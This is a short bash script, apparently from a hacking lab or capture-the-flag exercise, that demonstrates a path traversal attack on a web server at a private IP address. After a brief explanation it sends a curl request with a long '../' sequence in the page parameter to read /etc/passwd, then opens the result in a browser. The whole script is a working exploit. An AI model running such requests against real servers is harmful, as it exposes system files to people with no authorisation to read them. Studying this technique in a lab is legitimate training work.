#!/bin/bash/

echo "URL: http://192.168.43.236/?page="

echo "this method is called path traversal, our aim is to understand how deep the directory is:"

echo "press enter to continue"

read enter

curl -s http://192.168.43.236/?page=../../../../../../../../../../../etc/passwd -o response.html

google-chrome response.html
